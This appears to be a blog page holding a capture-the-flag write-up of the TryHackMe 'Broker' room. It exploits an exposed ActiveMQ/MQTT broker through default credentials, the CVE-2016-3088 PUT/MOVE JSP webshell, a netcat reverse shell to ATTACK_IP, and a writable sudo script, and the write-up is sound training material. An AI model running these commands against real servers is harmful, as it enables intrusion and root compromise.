@@ -1,0 +1,248 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Broker — MQTT Eavesdrop to Webshell — writeup · 0xmrerror</title>
+  <meta name="description" content="An exposed ActiveMQ/MQTT broker lets anyone subscribe to every sensor on the network — then a webshell upgrade path to root." />
+  <link rel="canonical" href="https://0xmrerror.me/writeups/broker/" />
+  <meta name="author" content="Skandar Hadrich" />
+  <meta name="theme-color" content="#080b10" />
+
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="0xmrerror.me" />
+  <meta property="og:title" content="Broker — MQTT Eavesdrop to Webshell — writeup · 0xmrerror" />
+  <meta property="og:description" content="An exposed ActiveMQ/MQTT broker lets anyone subscribe to every sensor on the network — then a webshell upgrade path to root." />
+  <meta property="og:url" content="https://0xmrerror.me/writeups/broker/" />
+  <meta property="og:image" content="https://0xmrerror.me/assets/og.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:locale" content="en" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Broker — MQTT Eavesdrop to Webshell — writeup · 0xmrerror" />
+  <meta name="twitter:description" content="An exposed ActiveMQ/MQTT broker lets anyone subscribe to every sensor on the network — then a webshell upgrade path to root." />
+  <meta name="twitter:image" content="https://0xmrerror.me/assets/og.png" />
+
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+
+  <link rel="preload" href="/fonts/inter-400-700.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="preload" href="/fonts/fira-code-400.woff2" as="font" type="font/woff2" crossorigin />
+  <link rel="stylesheet" href="/fonts/fonts.css" />
+  <link rel="stylesheet" href="/css/tokens.css" />
+  <link rel="stylesheet" href="/css/base.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/components.css" />
+  <link rel="stylesheet" href="/css/writeups.css" media="all" />
+  <link rel="stylesheet" href="/css/print.css" media="print" />
+  <script>
+(function(){var d=document.documentElement;d.classList.add('js');
+try{var t=localStorage.getItem('0xmrerror:theme');
+if(!t||t==='auto'){t=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';}
+d.dataset.theme=t;var a=localStorage.getItem('0xmrerror:accent');if(a){d.dataset.accent=a;}
+var p=localStorage.getItem('0xmrerror:theme');if(p&&p!=='auto'){d.dataset.theme=p;}}catch(e){}})();
+</script>
+    <script type="application/ld+json">{
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Broker \u2014 MQTT Eavesdrop to Webshell",
+    "description": "An exposed ActiveMQ/MQTT broker lets anyone subscribe to every sensor on the network \u2014 then a webshell upgrade path to root.",
+    "url": "https://0xmrerror.me/writeups/broker/",
+    "author": {
+      "@type": "Person",
+      "name": "Skandar Hadrich",
+      "url": "https://0xmrerror.me"
+    },
+    "keywords": "Web, Medium, thm, mqtt, activemq, webshell, iot, tryhackme",
+    "proficiencyLevel": "medium"
+  }</script>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+
+<div class="read-progress" data-read-progress aria-hidden="true"><i></i></div>
+
+<aside class="rail" aria-label="Section navigation">
+  <div class="rail-logo">0xmrerror<small>@hadrich</small></div>
+  <ul class="rail-nav" data-rail-nav>
+    <li><a class="rail-link" data-nav-link href="/#whoami">whoami</a></li><li><a class="rail-link" data-nav-link href="/#skills">skills</a></li><li><a class="rail-link" data-nav-link href="/#projects">projects</a></li><li><a class="rail-link" data-nav-link href="/#writeups">writeups</a></li><li><a class="rail-link" data-nav-link href="/#contact">contact</a></li>
+  </ul>
+  <div class="rail-progress" aria-hidden="true"><i></i></div>
+  <div class="rail-meta">
+    Tunis, Tunisia<br />
+    <span class="accent">available</span> — Feb 2027<br />
+    <a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a> ·
+    <a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a><br />
+    <button class="btn btn--sm btn--ghost" type="button" data-accent-toggle
+      style="margin-top:var(--sp-3);font-size:var(--fs-3xs);padding:4px 9px">accent</button>
+    <button class="btn btn--sm btn--ghost" type="button" data-theme-toggle data-theme-pref="auto"
+      style="font-size:var(--fs-3xs);padding:4px 9px">theme</button>
+  </div>
+</aside>
+<!-- palette entries (hidden, read by js/main.js) -->
+<ul class="sr-only" aria-hidden="true"><li class="palette-item" data-palette-item="whoami" data-palette-hint="section" data-palette-kind="section" href="/#whoami"></li><li class="palette-item" data-palette-item="skills" data-palette-hint="section" data-palette-kind="section" href="/#skills"></li><li class="palette-item" data-palette-item="projects" data-palette-hint="section" data-palette-kind="section" href="/#projects"></li><li class="palette-item" data-palette-item="writeups" data-palette-hint="section" data-palette-kind="section" href="/#writeups"></li><li class="palette-item" data-palette-item="contact" data-palette-hint="section" data-palette-kind="section" href="/#contact"></li><li class="palette-item" data-palette-item="Mr Robot CTF — WordPress to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/mr-robot/"></li><li class="palette-item" data-palette-item="WWBuddy — SQLi to Env-Var Privesc" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/ww-buddy/"></li><li class="palette-item" data-palette-item="Broker — MQTT Eavesdrop to Webshell" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/broker/"></li><li class="palette-item" data-palette-item="Watcher — LFI to Root in 7 Flags" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/watcher/"></li><li class="palette-item" data-palette-item="Fortress — SHA-1 Collision to Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/fortress/"></li><li class="palette-item" data-palette-item="Umbrella — Registry Loot to SUID Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/umbrella/"></li><li class="palette-item" data-palette-item="Super Secret Tip — Jinja SSTI to curl -K Root" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/super-secret-tip/"></li><li class="palette-item" data-palette-item="Smol — WP Plugin SSRF to sudo Bash" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/smol/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x200 — Three Anti-Debug Checks" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x200/"></li><li class="palette-item" data-palette-item="WinAntiDbg0x300 — UPX, a Watchdog, and an Infinite Loop" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/winantidbg0x300/"></li><li class="palette-item" data-palette-item="Binary Instrumentation 2 — Intercepting File Writes With Frida" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/binary-instrumentation-2/"></li><li class="palette-item" data-palette-item="Easy as GDB — Scripted Character-by-Character Brute Force" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/easy-as-gdb/"></li><li class="palette-item" data-palette-item="Keygenme — MD5 Hex Spliced Into a License Key" data-palette-hint="writeup" data-palette-kind="writeup" data-palette-url="/writeups/keygenme/"></li></ul>
+<nav id="nav" aria-label="Primary">
+  <div class="nav-inner">
+    <a class="nav-logo" href="/">0xmrerror<span>@terminal</span></a>
+    <ul class="nav-links" id="navLinks">
+      <li><a data-nav-link href="/#whoami">whoami</a></li><li><a data-nav-link href="/#skills">skills</a></li><li><a data-nav-link href="/#projects">projects</a></li><li><a data-nav-link href="/#writeups">writeups</a></li><li><a data-nav-link href="/#contact">contact</a></li>
+    </ul>
+    <div class="nav-actions">
+      <a class="btn btn--sm nav-cv" href="/cv.html">cv</a>
+      <button class="btn btn--icon btn--ghost" type="button" data-theme-toggle
+        data-theme-pref="auto" aria-label="Theme: system" title="Toggle theme">
+        <span aria-hidden="true">◐</span>
+      </button>
+      <button class="nav-toggle" id="navToggle" type="button"
+        aria-label="Toggle menu" aria-expanded="false" aria-controls="navLinks">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </div>
+</nav>
+
+<main id="main" class="wu">
+  <div class="container">
+    <a class="wu-back" href="/"><span aria-hidden="true">←</span> 0xmrerror@terminal:~/writeups</a>
+
+    <div class="wu-head">
+      <h1>Broker — MQTT Eavesdrop to Webshell</h1>
+      <p class="wu-summary">An exposed ActiveMQ/MQTT broker lets anyone subscribe to every sensor on the network — then a webshell upgrade path to root.</p>
+      <div class="wu-meta">
+        <span class="badge-diff" data-diff="medium">Medium</span><span class="badge-platform" data-platform="thm">TryHackMe</span><span class="writeup-time">Web · 15 min read</span><a class="tag" href="/?type=web#writeups">mqtt</a><a class="tag" href="/?type=web#writeups">activemq</a><a class="tag" href="/?type=web#writeups">webshell</a><a class="tag" href="/?type=web#writeups">iot</a><a class="tag" href="/?type=web#writeups">tryhackme</a>
+        <button class="flag-toggle" type="button" data-flag-toggle aria-pressed="false">🚩 hide flags</button>
+      </div>
+      <div class="series"><span>more web</span><a href="/writeups/mr-robot/">Mr Robot CTF</a><a href="/writeups/ww-buddy/">WWBuddy</a><a href="/writeups/broker/" class="is-current">Broker</a><a href="/writeups/watcher/">Watcher</a><a href="/writeups/fortress/">Fortress</a><a href="/writeups/umbrella/">Umbrella</a><a href="/writeups/super-secret-tip/">Super Secret Tip</a><a href="/writeups/smol/">Smol</a></div>
+    </div>
+
+    <div class="wu-layout">
+      <article class="prose" data-article>
+<h2>Broker — MQTT Eavesdrop to Root</h2>
+<p>An ActiveMQ server with two exposed services: an MQTT broker that lets anyone subscribe, and a management console with a classic put-shell CVE. Paul and Max thought they were being sneaky. Goal: flag.txt + root.txt.</p>
+
+<h3>1 · Enumeration</h3>
+<pre><code><span class="tok-comment"># The hint says the action is on high ports</span>
+<span class="tok-func">nmap</span> -sC -sV -p 1001-9999 broker.thm
+
+PORT    STATE SERVICE
+1883/tcp open  mqtt
+8161/tcp open  http   Jetty 9 (Apache ActiveMQ 5.9.0)</code></pre>
+
+<h3>2 · ActiveMQ Console</h3>
+<p>Port 8161 hosts an Apache ActiveMQ dashboard. The default <code>admin:admin</code> works. The <strong>Topics</strong> tab lists a <code>secret_chat</code> topic — that has to be where the "secret" messages flow.</p>
+
+<h3>3 · Eavesdropping on MQTT</h3>
+<p>The MQTT broker needs no credentials, so we subscribe to the topic with the Mosquitto client and read the conversation.</p>
+<pre><code><span class="tok-func">mosquitto_sub</span> -h broker.thm -t <span class="tok-string">'secret_chat/#'</span> -p <span class="tok-num">1883</span> -V mqttv31
+<span class="tok-comment"># &gt; Paul and Max chat about... the game "Hacknet"</span></code></pre>
+
+<h3>4 · CVE-2016-3088 — PUT/MOVE Webshell</h3>
+<p>ActiveMQ's <code>/fileserver</code> accepts an HTTP <code>PUT</code> upload but won't execute what's stored there. So we upload a JSP webshell and <code>MOVE</code> it into <code>/admin</code>, which does execute JSP. First leak the absolute path via the <code>%20</code> trick.</p>
+<pre><code><span class="tok-comment"># Upload cmd.jsp to /fileserver</span>
+<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">PUT</span> <span class="tok-string">"http://broker.thm:8161/fileserver/cmd.jsp"</span>   --data @cmd.jsp -H <span class="tok-string">'Content-Type: text/plain'</span>
+
+<span class="tok-comment"># Leak the absolute path</span>
+<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">GET</span> <span class="tok-string">"http://broker.thm:8161/fileserver/test/%20/%20"</span>
+<span class="tok-comment"># &gt; /opt/apache-activemq-5.9.0/webapps/fileserver/</span>
+
+<span class="tok-comment"># MOVE the shell into the executable /admin directory</span>
+<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">MOVE</span> <span class="tok-string">"http://broker.thm:8161/fileserver/cmd.jsp"</span>   -H <span class="tok-string">"Destination: http://broker.thm:8161/admin/cmd.jsp"</span>
+
+<span class="tok-comment"># RCE</span>
+http://broker.thm:8161/admin/cmd.jsp?cmd=<span class="tok-func">id</span></code></pre>
+
+<h3>5 · Reverse Shell</h3>
+<p>Long bash one-liners often get mangled by URL encoding here. Use <code>nc -e</code> or host a <code>msfvenom</code>-generated ELF and fetch it with curl. Then upgrade the TTY.</p>
+<pre><code><span class="tok-comment"># Attacker listener</span>
+<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span>
+
+<span class="tok-comment"># Payload (URL-encode spaces) through the webshell</span>
+<span class="tok-func">nc</span> -e /bin/bash <span class="tok-string">ATTACK_IP</span> <span class="tok-num">4444</span>
+
+<span class="tok-comment"># Upgrade TTY, then read the user flag</span>
+<span class="tok-func">python3</span> -c <span class="tok-string">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="tok-func">cat</span> /home/activemq/flag.txt
+<span class="tok-comment"># THM{...}</span></code></pre>
+
+<h3>6 · Privesc — Writable Sudo Script</h3>
+<p><code>sudo -l</code> shows activemq can run <code>subscribe.py</code> as root with no password — and the file is owned (and writable) by activemq. Append code that drops a shell.</p>
+<pre><code><span class="tok-func">sudo</span> -l
+(root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
+<span class="tok-func">ls</span> -l /opt/apache-activemq-5.9.0/subscribe.py
+-rw-rw-r-- <span class="tok-num">1</span> activemq activemq <span class="tok-num">768</span> subscribe.py
+
+<span class="tok-func">echo</span> <span class="tok-string">'import os; os.system("/bin/bash")'</span> &gt;&gt; /opt/apache-activemq-5.9.0/subscribe.py
+
+<span class="tok-func">sudo</span> -u root /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
+<span class="tok-comment"># &gt; root shell</span>
+root@broker:~# <span class="tok-func">cat</span> /root/root.txt
+<span class="tok-comment"># THM{...}</span></code></pre>
+
+<h3>7 · Retrospective</h3>
+<p>Attack chain: default ActiveMQ creds → MQTT eavesdrop → PUT/MOVE webshell (CVE-2016-3088) → writable sudo script. Lessons: never run a broker with null auth, lock down <code>/fileserver</code>, and audit what your own user-scripted sudo targets.</p>
+
+      </article>
+
+      <aside class="toc" data-toc-wrap>
+        <nav class="toc" data-toc aria-label="On this page">
+          <h2>on this page</h2>
+        </nav>
+      </aside>
+    </div>
+
+    <nav class="wu-nav" aria-label="More writeups">
+      <a class="prev" href="/writeups/ww-buddy/"><small>← previous</small><span>WWBuddy — SQLi to Env-Var Privesc</span></a>
+      <a class="next" href="/writeups/watcher/"><small>next →</small><span>Watcher — LFI to Root in 7 Flags</span></a>
+    </nav>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-inner">
+      <div class="footer-prompt">
+        <b>0xmrerror</b>@terminal:~$ <span aria-hidden="true">█</span>
+        <p class="footer-note">Hosted on GitHub Pages. Built with no framework, no build server, no trackers.</p>
+      </div>
+      <div class="footer-cols">
+        <div class="footer-col">
+          <h4>site</h4>
+          <ul>
+            <li><a href="/">home</a></li>
+            <li><a href="/#writeups">writeups</a></li>
+            <li><a href="/cv.html">cv</a></li>
+            <li><a href="/feed.xml">rss</a></li>
+            <li><a href="/sitemap.xml">sitemap</a></li>
+          </ul>
+        </div>
+        <div class="footer-col">
+          <h4>elsewhere</h4>
+          <ul>
+            <li><a href="https://github.com/skandarhadrich-cell" rel="noopener">github</a></li>
+            <li><a href="https://linkedin.com/in/skandar-hadrich-128221369" rel="noopener">linkedin</a></li>
+            <li><a href="mailto:skandar.hadrich@etudiant.enit.utm.tn">email</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="footer-base">
+      <span>© 2026 Skandar Hadrich · MIT licensed</span>
+      <span>since <span data-since="2026-02-09" data-since-prefix="">—</span> on GitHub</span>
+    </div>
+  </div>
+</footer>
+<div class="palette" id="palette" role="dialog" aria-modal="true" aria-label="Command palette">
+  <div class="palette-box">
+    <input class="palette-input" id="paletteInput" type="text" placeholder="jump to a section or search writeups…"
+      autocomplete="off" spellcheck="false" aria-label="Search sections and writeups" />
+    <ul class="palette-list" id="paletteList" role="listbox" aria-label="Results"></ul>
+    <div class="palette-foot">
+      <span><b>↑↓</b> navigate</span><span><b>↵</b> open</span><span><b>esc</b> close</span>
+    </div>
+  </div>
+</div>
+<script src="/js/main.js" defer></script>
+<script src="/js/writeups.js" defer></script>
+</body>
+</html>
